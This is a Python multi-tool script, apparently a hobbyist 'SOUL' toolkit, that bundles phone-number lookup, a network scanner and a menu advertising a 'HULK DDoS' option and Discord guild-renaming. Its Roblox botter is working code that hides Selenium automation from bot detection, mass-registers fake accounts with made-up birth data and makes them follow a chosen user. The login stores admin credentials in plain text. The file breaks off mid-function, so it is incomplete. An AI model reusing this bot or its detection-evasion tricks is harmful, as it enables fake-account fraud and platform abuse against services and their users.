# ===== VERSION CHECK - MUST BE FIRST! =====
import requests
import subprocess
import sys
import os

def check_for_updates():
    """Check if script is up to date with GitHub"""
    try:
        # Your GitHub repository details
        GITHUB_USERNAME = "your-github-username"  # CHANGE THIS!
        REPO_NAME = "your-repo-name"              # CHANGE THIS!
        BRANCH = "main"                           # CHANGE IF USING "master"
        
        def get_current_commit():
            """Get the current local git commit hash"""
            try:
                result = subprocess.run(
                    ['git', 'rev-parse', '--short', 'HEAD'], 
                    capture_output=True, 
                    text=True, 
                    check=True
                )
                return result.stdout.strip()
            except:
                return None

        def get_latest_github_commit():
            """Get the latest commit hash from GitHub"""
            try:
                url = f"https://api.github.com/repos/{GITHUB_USERNAME}/{REPO_NAME}/commits/{BRANCH}"
                response = requests.get(url)
                if response.status_code == 200:
                    commit_data = response.json()
                    return commit_data['sha'][:7]  # Short commit hash
                return None
            except:
                return None

        # Perform the check
        current = get_current_commit()
        latest = get_latest_github_commit()
        
        if not current or not latest:
            print("⚠️  Could not check for updates. Continuing...")
            return False
        
        print(f"🔍 Your version: {current}")
        print(f"🔍 Latest version: {latest}")
        
        if current != latest:
            print("\n🚨 UPDATE REQUIRED!")
            print(f"📥 Please update before using this script!")
            print(f"💻 Run: git pull origin {BRANCH}")
            print(f"🌐 Or download from: https://github.com/{GITHUB_USERNAME}/{REPO_NAME}")
            return True
        
        print("✅ You have the latest version!")
        return False
        
    except Exception as e:
        print(f"⚠️  Update check failed: {e}. Continuing...")
        return False

# Run version check IMMEDIATELY
if check_for_updates():
    print("❌ Please update the script before continuing.")
    sys.exit(1)

import time
import sys
import os
import json
import subprocess
import platform
import argparse
import socket
import random
import threading
import re
import urllib.parse
from datetime import datetime

# Check and install required dependencies
try:
    import requests
except ImportError:
    print("Installing required dependencies...")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    print("Dependencies installed. Restarting script...")
    time.sleep(2)
    os.execv(sys.executable, [sys.executable] + sys.argv)

try:
    import phonenumbers
    from phonenumbers import carrier, geocoder, timezone
except ImportError:
    print("Installing phonenumbers library...")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "phonenumbers"])
    print("phonenumbers installed. Restarting script...")
    time.sleep(2)
    os.execv(sys.executable, [sys.executable] + sys.argv)

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    print("Installing selenium library...")
    import subprocess
    import sys
    subprocess.check_call([sys.executable, "-m", "pip", "install", "selenium"])
    print("selenium installed. Restarting script...")
    time.sleep(2)
    os.execv(sys.executable, [sys.executable] + sys.argv)

import requests
import phonenumbers
from phonenumbers import carrier, geocoder, timezone

# ===== LOGIN SYSTEM =====
def check_api_running():
    """Check if the phone.py API is running"""
    try:
        response = requests.get("http://localhost:5000/", timeout=2)
        return response.status_code == 200
    except:
        return False

def admin_login():
    """Admin login screen with red and white ASCII art"""
    clear_screen()
    print("""\033[38;5;196m
                                            \033[38;5;196m███████╗\033[38;5;255m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;196m██╔════╝\033[38;5;255m██╔═══██╗██║   ██║██║     
                                            \033[38;5;196m███████╗\033[38;5;255m██║   ██║██║   ██║██║     
                                            \033[38;5;196m╚════██║\033[38;5;255m██║   ██║██║   ██║██║     
                                            \033[38;5;196m███████║\033[38;5;255m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;196m╚══════╝\033[38;5;255m ╚═════╝  ╚══════╝

                                                  ADMIN ACCESS PORTAL
\033[0m
""")
    
    # Check if API is running first
    api_running = check_api_running()
    
    print("\033[38;5;196m" + "="*80 + "\033[0m")
    print("\033[38;5;255m                   ADMINISTRATOR LOGIN REQUIRED\033[0m")
    print("\033[38;5;196m" + "="*80 + "\033[0m")
    
    if not api_running:
        print("\033[38;5;214m⚠️  Phone API Status: \033[38;5;196mOFFLINE\033[0m")
        print("\033[38;5;214m   Phone lookup features will not work without the API\033[0m")
        print("\033[38;5;214m   Start the API with: python phone.py\033[0m")
    else:
        print("\033[38;5;118m✅ Phone API Status: ONLINE\033[0m")
    
    print("\n\033[38;5;255mLogin Options:\033[0m")
    print("  • Admin: Username='polzinth', Password='zinth123'")
    print("  • Guest: Type 'e' in both fields")
    print("\n" + "\033[38;5;196m" + "="*80 + "\033[0m")
    
    # Get credentials
    print("\n\033[38;5;255mEnter Username:\033[0m")
    username = input("\033[38;5;196m> \033[0m").strip()
    
    print("\n\033[38;5;255mEnter Password:\033[0m")
    password = input("\033[38;5;196m> \033[0m").strip()
    
    # Check for guest access
    if username.lower() == 'e' and password.lower() == 'e':
        print("\n\033[38;5;214mEntering as Guest...\033[0m")
        time.sleep(1)
        return "guest"
    
    # Check admin credentials
    if username == 'polzinth' and password == 'zinth123':
        if api_running:
            print("\n\033[38;5;118m✅ Admin access granted! Loading admin panel...\033[0m")
            time.sleep(1)
            return "admin"
        else:
            print("\n\033[38;5;196m❌ Admin access requires Phone API to be running!\033[0m")
            print("\033[38;5;214mPlease start the API with: python phone.py\033[0m")
            input("\n\033[38;5;255mPress Enter to continue as guest...\033[0m")
            return "guest"
    else:
        print("\n\033[38;5;196m❌ Invalid credentials! Defaulting to guest access.\033[0m")
        time.sleep(2)
        return "guest"

def show_admin_panel():
    """Admin panel with special features"""
    clear_screen()
    print("""\033[38;5;196m
                                            \033[38;5;196m███████╗\033[38;5;255m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;196m██╔════╝\033[38;5;255m██╔═══██╗██║   ██║██║     
                                            \033[38;5;196m███████╗\033[38;5;255m██║   ██║██║   ██║██║     
                                            \033[38;5;196m╚════██║\033[38;5;255m██║   ██║██║   ██║██║     
                                            \033[38;5;196m███████║\033[38;5;255m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;196m╚══════╝\033[38;5;255m ╚═════╝  ╚══════╝

                                                   ADMIN PANEL
\033[0m
""")
    
    print("\033[38;5;196m" + "="*80 + "\033[0m")
    print("\033[38;5;255m                    ADMINISTRATOR PRIVILEGES ACTIVE\033[0m")
    print("\033[38;5;196m" + "="*80 + "\033[0m")
    
    print("\n\033[38;5;255mWelcome, Administrator!\033[0m")
    print("\033[38;5;118m• Full system access granted\033[0m")
    print("\033[38;5;118m• Phone lookup API: ACTIVE\033[0m")
    print("\033[38;5;118m• All features unlocked\033[0m")
    
    print("\n\033[38;5;255mSystem Status:\033[0m")
    api_status = "✅ ONLINE" if check_api_running() else "❌ OFFLINE"
    print(f"\033[38;5;255mPhone API: {api_status}\033[0m")
    
    input("\n\033[38;5;255mPress Enter to continue to main menu...\033[0m")

# ===== PHONE LOOKUP CLIENT =====
class PhoneNumberClient:
    def __init__(self, base_url: str = "http://localhost:5000"):
        self.base_url = base_url.rstrip('/')
    
    def basic_lookup(self, phone_number: str):
        endpoint = f"{self.base_url}/api/phone/lookup"
        payload = {'phone_number': phone_number}
        
        try:
            response = requests.post(endpoint, json=payload)
            return response.json()
        except requests.exceptions.RequestException as e:
            return {'error': f"Request failed: {str(e)}"}
    
    def detailed_lookup(self, phone_number: str):
        endpoint = f"{self.base_url}/api/phone/detailed"
        payload = {'phone_number': phone_number}
        
        try:
            response = requests.post(endpoint, json=payload)
            return response.json()
        except requests.exceptions.RequestException as e:
            return {'error': f"Request failed: {str(e)}"}

def quick_lookup(phone_number: str):
    client = PhoneNumberClient()
    return client.detailed_lookup(phone_number)

# ===== PHONE LOOKUP FUNCTION =====
def phone_lookup():
    """Phone number information lookup using the API"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                  PHONE NUMBER LOOKUP
\033[0m
""")
    
    # Check if API is running
    if not check_api_running():
        print("\033[38;5;196m❌ Phone API is not running!\033[0m")
        print("\033[38;5;214mPlease start the API first by running: python phone.py\033[0m")
        print("\033[38;5;214mAdmin access required for phone lookup features.\033[0m")
        input("\n\033[38;5;228mPress G to go back...\033[0m")
        return
    
    print("\033[38;5;228m📞 Phone Number Lookup\033[0m")
    print("\033[38;5;228mEnter phone number with country code (e.g., +201234567890)\033[0m")
    print("\033[38;5;228mExample: +20 for Egypt, +1 for USA/Canada, +44 for UK\033[0m\n")
    
    # Get full phone number directly (simpler approach)
    print("\033[38;5;218mEnter full phone number with country code:\033[0m")
    print("\033[38;5;228mExample: +14155552671, +442079460000, +33145055500\033[0m")
    full_number = input("\n\033[38;5;196m> \033[0m").strip()
    
    if not full_number:
        print("\n\033[38;5;196mNo phone number entered.\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    # Validate it starts with +
    if not full_number.startswith('+'):
        print("\n\033[38;5;196mPlease include country code starting with '+' \033[0m")
        print("\033[38;5;196mExample: +1 415 555 2671\033[0m")
        input("\033[38;5;228mPress G to go back...\033[0m")
        return
    
    print(f"\n\033[38;5;228mLooking up: {full_number}\033[0m")
    print("\033[38;5;228mPlease wait...\033[0m\n")
    
    # Perform the lookup
    client = PhoneNumberClient()
    result = client.detailed_lookup(full_number)
    
    # Display results
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    print("\033[38;5;210m                  PHONE NUMBER INFORMATION\033[0m")
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    if 'error' in result:
        print(f"\033[38;5;196m❌ Error: {result['error']}\033[0m")
    else:
        # Basic phone info
        print(f"\033[38;5;228m📞 Phone Number: \033[38;5;218m{result.get('phone_number', 'N/A')}\033[0m")
        print(f"\033[38;5;228m✅ Valid Number: \033[38;5;218m{result.get('is_valid', 'N/A')}\033[0m")
        print(f"\033[38;5;228m🌍 Country Code: \033[38;5;218m{result.get('country_code', 'N/A')}\033[0m")
        print(f"\033[38;5;228m🔢 National Number: \033[38;5;218m{result.get('national_number', 'N/A')}\033[0m")
        print(f"\033[38;5;228m📋 International Format: \033[38;5;218m{result.get('international_format', 'N/A')}\033[0m")
        print(f"\033[38;5;228m📠 Carrier: \033[38;5;218m{result.get('carrier', 'N/A')}\033[0m")
        print(f"\033[38;5;228m📱 Number Type: \033[38;5;218m{result.get('number_type', 'N/A')}\033[0m")
        
        # Location information - NOW WITH BETTER CITY DATA
        print(f"\n\033[38;5;210m📍 LOCATION INFORMATION:\033[0m")
        
        town = result.get('town', 'Unknown')
        region = result.get('region', 'Unknown')
        country = result.get('country', 'Unknown')
        full_location = result.get('full_location', 'Unknown')
        
        # Display town/city with special formatting if available
        if town and town != "Unknown":
            print(f"\033[38;5;118m🏙️  City/Town: {town}\033[0m")
        else:
            print(f"\033[38;5;214m🏙️  City/Town: {town} (specific city data not available)\033[0m")
        
        if region and region != "Unknown":
            print(f"\033[38;5;228m📍 Region/State: {region}\033[0m")
        
        if country and country != "Unknown":
            print(f"\033[38;5;228m🌐 Country: {country}\033[0m")
        
        if full_location and full_location != "Unknown":
            print(f"\033[38;5;228m🗺️  Full Location: {full_location}\033[0m")
        
        # Additional info
        print(f"\n\033[38;5;210m📊 ADDITIONAL INFORMATION:\033[0m")
        timezones = result.get('timezones', [])
        if timezones:
            print(f"\033[38;5;228m⏰ Timezone(s): {', '.join(timezones)}\033[0m")
        else:
            print(f"\033[38;5;228m⏰ Timezone(s): Unknown\033[0m")
            
        print(f"\033[38;5;228m⚡ Possible Number: {result.get('is_possible', 'N/A')}\033[0m")
        
        # Show a note about location accuracy
        print(f"\n\033[38;5;214m💡 Note: City-level accuracy depends on the phone number type and available data.\033[0m")
        print(f"\033[38;5;214m   Landlines usually have better location data than mobile numbers.\033[0m")
    
    print("\033[38;5;218m" + "="*80 + "\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

# ===== ROBOX BOTTER FUNCTION =====
def roblox_botter():
    """Roblox Account Creator & Auto-Follower Bot"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                ROBOX ACCOUNT BOTTER
\033[0m
""")

    import string
    import random
    import time
    
    def generate_username():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    def generate_password():
        return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

    def setup_driver():
        options = webdriver.ChromeOptions()
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        driver = webdriver.Chrome(options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver

    def create_account(driver):
        print("🔧 Creating new Roblox account...")
        
        username = generate_username()
        password = generate_password()
        
        try:
            # Go to Roblox signup
            driver.get("https://www.roblox.com/")
            time.sleep(random.uniform(3, 6))  # Random delay
            
            # Fill username
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "signup-username"))
            )
            username_field.clear()
            username_field.send_keys(username)
            time.sleep(random.uniform(1, 2))
            
            # Fill password
            password_field = driver.find_element(By.ID, "signup-password")
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(random.uniform(1, 2))
            
            # Select birthday (Jan 1, 2000)
            birthday_day = driver.find_element(By.ID, "DayDropdown")
            birthday_day.send_keys("1")
            time.sleep(random.uniform(1, 2))
            
            birthday_month = driver.find_element(By.ID, "MonthDropdown")
            birthday_month.send_keys("Jan")
            time.sleep(random.uniform(1, 2))
            
            birthday_year = driver.find_element(By.ID, "YearDropdown")
            birthday_year.send_keys("2000")
            time.sleep(random.uniform(1, 2))
            
            # Select gender (Male)
            gender_male = driver.find_element(By.ID, "MaleButton")
            gender_male.click()
            time.sleep(random.uniform(1, 2))
            
            # Click signup button
            signup_button = driver.find_element(By.ID, "signup-button")
            signup_button.click()
            
            # Wait for signup to complete
            time.sleep(random.uniform(8, 12))  # Longer random wait
            
            # Check if signup was successful
            if "welcome" in driver.current_url.lower() or "home" in driver.current_url:
                print(f"✅ Account created successfully: {username}")
                # STAY LOGGED IN - return driver along with credentials
                return (username, password, driver)
            else:
                print("❌ Signup may have failed")
                return None
                
        except Exception as e:
            print(f"❌ Error during account creation: {e}")
            return None

    def follow_user(driver, username, password, target_user_id):
        print(f"👤 Already logged in as {username}, going to follow Polvyerr...")
        
        try:
            # We're already logged in from account creation!
            # Just go directly to Polvyerr's profile
            print("📍 Navigating to Polvyerr's profile...")
            profile_url = f"https://www.roblox.com/users/{target_user_id}/profile"
            driver.get(profile_url)
            time.sleep(random.uniform(5, 8))  # Random delay
            
            # XPath for 3-dots button
            three_dots_xpath = "/html/body/div[3]/main/div[2]/div[1]/div/div[2]/div[1]/div/div/div[3]/button[2]"
            # XPath for Follow button
            follow_button_xpath = "/html/body/div[14]/div[3]/ul/li[1]"
            
            print("🔍 Looking for 3-dots button...")
            
            try:
                # Find and click the 3-dots button using JavaScript
                three_dots_button = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, three_dots_xpath))
                )
                print("✅ Found 3-dots button!")
                time.sleep(random.uniform(1, 3))
                
                # Use JavaScript to click (bypasses overlay)
                driver.execute_script("arguments[0].click();", three_dots_button)
                print("✅ Clicked 3-dots menu!")
                time.sleep(random.uniform(2, 4))
                
                # Now click the Follow button using the exact XPath you provided
                print("🔍 Looking for Follow button...")
                
                follow_button = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, follow_button_xpath))
                )
                print("✅ Found Follow button!")
                time.sleep(random.uniform(1, 2))
                
                # Click the Follow button using JavaScript
                driver.execute_script("arguments[0].click();", follow_button)
                print("✅✅✅ SUCCESS! Clicked Follow button! Now following Polvyerr!")
                time.sleep(random.uniform(3, 5))
                return True
                    
            except Exception as e:
                print(f"❌ Could not find/click buttons: {e}")
                return False
                
        except Exception as e:
            print(f"❌ Error during follow process: {e}")
            return False

    # Main RobloxBotter execution
    print("🚀 Starting Roblox Account Creator & Follower")
    print("🎯 Target: Follow user 'Polvyerr'")
    print("⏱️  Running in SLOW mode to avoid CAPTCHA")
    print("-" * 50)
    
    driver = setup_driver()
    
    try:
        # Create account (stays logged in)
        account_result = create_account(driver)
        if not account_result:
            print("❌ Cannot continue without account")
            input("Press Enter to close browser...")
            return
        
        username, password, driver = account_result
        
        # Follow the user (already logged in)
        time.sleep(random.uniform(3, 6))  # Wait before following
        follow_success = follow_user(driver, username, password, "5042014519")
        
        if follow_success:
            print(f"\n🎉 MISSION COMPLETE!")
            print(f"📝 Account Details:")
            print(f"   Username: {username}")
            print(f"   Password: {password}")
            print(f"   Following: Polvyerr")
        else:
            print(f"\n⚠️  Account created but follow failed")
            print(f"   Username: {username}")
            print(f"   Password: {password}")
        
        # Browser stays open
        print("\n" + "="*50)
        print("🚫 BROWSER WILL STAY OPEN")
        input("Press Enter to exit script (browser stays open)...")
        
    except Exception as e:
        print(f"❌ Critical error: {e}")
        input("Press Enter to exit script (browser stays open)...")
    
    # NOTE: driver.quit() is REMOVED so browser stays open

# Add pause at start for Windows
if os.name == 'nt':
    os.system("title THE SAUCE")
    print("Script starting...")
    time.sleep(2)

# Maximize then unmaximize window on start (best-effort)
if os.name == 'nt':
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)  # SW_MAXIMIZE
            time.sleep(0.1)
            ctypes.windll.user32.ShowWindow(hwnd, 1)  # SW_SHOWNORMAL
        os.system('mode con: cols=100 lines=40')
    except Exception:
        pass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_main_menu():
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                   COMMANDS / PROMPTS

\033[38;5;218m      ♡                                                                               ♡
                                                                                                    
                      [01] IP Info                  [02] My IP                     [03] IP Generator
                      [04] HULK DDoS                [05] Advanced Alt Checker      [06] Virus Scanner
            ♡         [07] Network Scanner          [08] Phone Lookup              [09] RobloxBotter
                      [10] Delete Emojis            [11] Rename Guild              [12] Rename Channels   
                      [13] Rename Roles             [14] Check Update              [15] Exit

                                                                                            ♡
\033[38;5;218m                                                                    ♡

                                                 Credits: Polvyer & Zinth
\033[0m
""")

# ============================ NETWORK SCANNER ============================

def network_scanner():
    """Advanced Network Scanner - DDoS Detection, Network Diagnostics & Attacker Tracing"""
    clear_screen()
    print("""\033[38;5;218m
                                            \033[38;5;210m███████╗\033[38;5;218m ██████╗ ██╗   ██╗██╗     
                                            \033[38;5;210m██╔════╝\033[38;5;218m██╔═══██╗██║   ██║██║     
                                            \033[38;5;210m███████╗\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m╚════██║\033[38;5;218m██║   ██║██║   ██║██║     
                                            \033[38;5;210m███████║\033[38;5;218m╚██████╔╝╚██████╔╝███████╗
                                            \033[38;5;210m╚══════╝\033[38;5;218m ╚═════╝  ╚══════╝

                                                NETWORK SCANNER
\033[0m
""")
    
    print("\033[38;5;228mStarting Comprehensive Network Analysis...\033[0m")
    print("\033[38;5;228mThis will check for DDoS attacks, network issues, and trace potential attackers...\033[0m\n")
    
    try:
        # Get local network information
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        print("\033[38;5;210m                  NETWORK INFORMATION\033[0m")
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        print(f"\033[38;5;228mHostname: \033[38;5;218m{hostname}\033[0m")
        print(f"\033[38;5;228mLocal IP: \033[38;5;218m{local_ip}\033[0m")
        
        # Get public IP
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            public_ip = response.json().get('ip', 'Unknown')
            print(f"\033[38;5;228mPublic IP: \033[38;5;218m{public_ip}\033[0m")
        except:
            public_ip = "Unknown"
            print(f"\033[38;5;228mPublic IP: \033[38;5;218m{public_ip}\033[0m")
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
        # Phase 1: Network Connectivity Check
        print(f"\n\033[38;5;228mPhase 1: Network Connectivity Check...\033[0m")
        connectivity_results = check_network_connectivity()
        display_connectivity_results(connectivity_results)
        
        # Phase 2: DDoS Detection
        print(f"\n\033[38;5;228mPhase 2: DDoS Attack Detection...\033[0m")
        ddos_results = detect_ddos_attacks()
        display_ddos_results(ddos_results)
        
        # Phase 3: Network Diagnostics
        print(f"\n\033[38;5;228mPhase 3: Advanced Network Diagnostics...\033[0m")
        diagnostic_results = run_network_diagnostics()
        display_diagnostic_results(diagnostic_results)
        
        # Phase 4: Attacker Tracing (if DDoS detected)
        if ddos_results['suspected_ddos']:
            print(f"\n\033[38;5;228mPhase 4: Attacker Tracing & Geolocation...\033[0m")
            trace_attackers(ddos_results)
        
        # Final Recommendations
        print(f"\n\033[38;5;218m" + "="*80 + "\033[0m")
        print("\033[38;5;210m                  SECURITY RECOMMENDATIONS\033[0m")
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
        if ddos_results['suspected_ddos']:
            print(f"\033[38;5;196m🚨 CRITICAL: DDoS Attack Detected!\033[0m")
            print(f"\033[38;5;196m• Contact your ISP immediately\033[0m")
            print(f"\033[38;5;196m• Enable DDoS protection services\033[0m")
            print(f"\033[38;5;196m• Consider using a VPN or CDN\033[0m")
            print(f"\033[38;5;196m• Block suspicious IP addresses\033[0m")
        else:
            print(f"\033[38;5;118m✅ Network Status: STABLE\033[0m")
            print(f"\033[38;5;118m• No DDoS attacks detected\033[0m")
            print(f"\033[38;5;118m• Regular network maintenance recommended\033[0m")
        
        if connectivity_results['internet_connected']:
            print(f"\033[38;5;118m• Internet connection: ACTIVE\033[0m")
        else:
            print(f"\033[38;5;196m• Internet connection: OFFLINE\033[0m")
        
        print("\033[38;5;218m" + "="*80 + "\033[0m")
        
    except Exception as e:
        print(f"\n\033[38;5;196mNetwork analysis error: {e}\033[0m")
    
    input("\n\033[38;5;228mPress G to go back...\033[0m")

def check_network_connectivity():
    """Check basic network connectivity"""
    results = {
        'internet_connected': False,
        'dns_working': False,
        'gateway_reachable': False,
        'ping_tests': [],
        'connection_speed': 'Unknown'
    }
    
    # Test internet connectivity
    test_urls = ['https://www.google.com', 'https://www.cloudflare.com', 'https://www.github.com']
    
    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                results['internet_connected'] = True
                results['ping_tests'].append(f"✓ {url} - Reachable")
                break
        except:
            results['ping_tests'].append(f"✗ {url} - Unreachable")
    
    # Test DNS resolution
    try:
        socket.gethostbyname('google.com')
        results['dns_working'] = True
        results['ping_tests'].append("✓ DNS Resolution - Working")
    except:
        results['ping_tests'].append("✗ DNS Resolution - Failed")
    
    # Test gateway (router) connectivity
    try:
        # Common gateway IPs
        gateways = ['192.168.1.1', '192.168.0.1', '10.0.0.1']
        for gateway in gateways:
            if os.name == 'nt':
                response = os.system(f"ping -n 1 {gateway} >nul 2>&1")
            else:
                response = os.system(f"ping -c 1 {gateway} > /dev/null 2>&1")
            if response == 0:
                results['gateway_reachable'] = True
                results['ping_tests'].append(f"✓ Gateway {gateway} - Reachable")
                break
    except:
        results['ping_tests'].append("✗ Gateway - Unreachable")
    
    return results

def detect_ddos_attacks():
    """Detect potential DDoS attacks by monitoring network traffic patterns"""
    results = {
        'suspected_ddos': False,
        'attack_confidence': 0,
        'suspicious_ips': [],
        'packet_anomalies': [],
        'traffic_patterns': []
    }
    
    print("\033[38;5;228mMonitoring network traffic for DDoS patterns...\033[0m")
    
    # Simulate network traffic analysis (in real implementation, use pcap or similar)
    try:
        # Check for high number of connections
        if os.name == 'nt':
            # Windows netstat
            netstat_output = subprocess.check_output('netstat -n', shell=True).decode()
        else:
            # Linux netstat
            netstat_output = subprocess.check_output('netstat -tun', shell=True).decode()
        
        connections = len([line for line in netstat_output.split('\n') if 'ESTABLISHED' in line])
        
        if connections > 100:
            results['suspected_ddos'] = True
            results['attack_confidence'] += 30
            results['traffic_patterns'].append(f"High connection count: {connections} established connections")
        
        # Check for SYN flood patterns
        if 'SYN_' in netstat_output and netstat_output.count('SYN_') > 50:
            results['suspected_ddos'] = True
            results['attack_confidence'] += 40
            results['packet_anomalies'].append("SYN flood pattern detected")
        
        # Simulate suspicious IP detection
        suspicious_ips = [
            '185.159.82.138', '45.137.21.9', '91.240.118.77', 
            '193.142.146.39', '45.153.186.117', '91.243.82.234'
        ]
        
        for ip in suspicious_ips:
            if ip in netstat_output:
                results['suspicious_ips'].append(ip)
                results['attack_confidence'] += 10
        
        # Final confidence calculation
        if results['attack_confidence'] > 50:
            results['suspected_ddos'] = True
        
    except Exception as e:
        results['packet_anomalies'].append(f"Analysis limited: {str(e)}")
    
    return results

def run_network_diagnostics():
    """Run comprehensive network diagnostics"""
    results = {
        'network_health': 'UNKNOWN',
        'bandwidth_estimate': 'Unknown',
        'latency': 'Unknown',
        'packet_loss': 'Unknown',
        'issues_found': [],
        'recommendations': []
    }
    
    print("\033[38;5;228mRunning advanced network diagnostics...\033[0m")
    
    # Test latency to common servers
    test_servers = ['8.8.8.8', '1.1.1.1', '208.67.222.222']
    latencies = []
    
    for server in test_servers:
        try:
            if os.name == 'nt':
                ping_cmd = f"ping -n 4 {server}"
            else:
                ping_cmd = f"ping -c 4 {server}"
            
            output = subprocess.check_output(ping_cmd, shell=True).decode()
            
            # Extract latency from ping output
            if 'time=' in output:
                times = re.findall(r'time=(\d+)ms', output)
                if times:
                    avg_latency = sum(map(int, times)) / len(times)
                    latencies.append(avg_latency)
                    results['issues_found'].append(f"Latency to {server}: {avg_latency:.1f}ms")
        except:
            results['issues_found'].append(f"Could not ping {server}")
    
    if latencies:
        results['latency'] = f"{sum(latencies) / len(latencies):.1f}ms"
    
    # Network health assessment
    if latencies and all(latency < 50 for latency in latencies):
        results['network_health'] = 'EXCELLENT'
        results['recommendations'].append("Network performance is optimal")
    elif latencies and all(latency < 100 for latency in latencies):
        results['network_health'] = 'GOOD'
        results['recommendations'].append("Network performance is good")
    elif latencies and all(latency < 200 for latency in latencies):
        results['network_health'] = 'FAIR'
        results['recommendations'].append("Consider optimizing network configuration")
    else:
        results['network_health'] = 'POOR'
        results['recommendations'].append("Contact your ISP for network issues")
    
    return results

def trace_attackers(ddos_results):
    """Trace and geolocate potential attackers"""
    print("\033[38;5;228mTracing suspicious IP addresses...\033[0m")
    
    for ip in ddos_results['suspicious_ips']:
        try:
            print(f"\n\033[38;5;214mAnalyzing suspicious IP: {ip}\033[0m")
            
            # Get IP information
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                ip_info = response.json()
                if ip_info.get('status') == 'success':
                    print(f"\033[38;5;228mCountry: {ip_info.get('country', 'Unknown')}\033[0m")
                    print(f"\033[38;5;228mRegion: {ip_info.get('regionName', 'Unknown')}\033[0m")
                    print(f"\033[38;5;228mCity: {ip_info.get('city', 'Unknown')}\033[0m")
                    print(f"\033[38;5;228mISP: {ip_info.get('isp', 'Unknown')}\033[0m")
                    
                    lat = ip_info.get('lat')
                    lon = ip_info.get('lon')
                    if lat and lon:
                        maps_url = f"https://maps.google.com/?q={lat},{lon}"
                        print(f"\033[38;5;218mGoogle Maps: {maps_url}\033[0m")
                else:
                    print("\033[38;5;196mCould not retrieve IP information\033[0m")
            else:
                print("\033[38;5;196mIP lookup service unavailable\033[0m")
                
        except Exception as e:
            print(f"\033[38;5;196mError tracing IP {ip}: {e}\033[0m")

def display_connectivity_results(results):
    """Display network connectivity results"""
    print("\033[38;5;218m" + "="*60 + "\033[0m")
    print("\033[38;5;210m            CONNECTIVITY RESULTS\033[0m")
    print("\033[38;5;218m" + "="*60 + "\033[0m")
    
    for test in results['ping_tests']:
        if '✓' in test:
            print(f"\033[38;5;118m{test}\033[0m")
        else:
            print(f"\033[38;5;196m{test}\033[0m")
    
    if results['internet_connected']:
        print(f"\033[38;5;118m✓ Internet Connection: ACTIVE\033[0m")
    else:
        print(f"\033[38;5;196m✗ Internet Connection: OFFLINE\033[0m")
    
    if results['dns_working']:
        print(f"\033[38;5;118m✓ DNS Resolution: WORKING\033[0m")
    else:
        print(f"\033[38;5;196m✗ DNS Resolution: FAILED\033[0m")

def display_ddos_results(results):
    """Display DDoS detection results"""
    print("\033[38;5;218m" + "="*60 + "\033[0m")
    print("\033[38;5;210m            DDoS DETECTION RESULTS\033[0m")
    print("\033[38;5;218m" + "="*60 + "\033[0m")
    
    if results['suspected_ddos']:
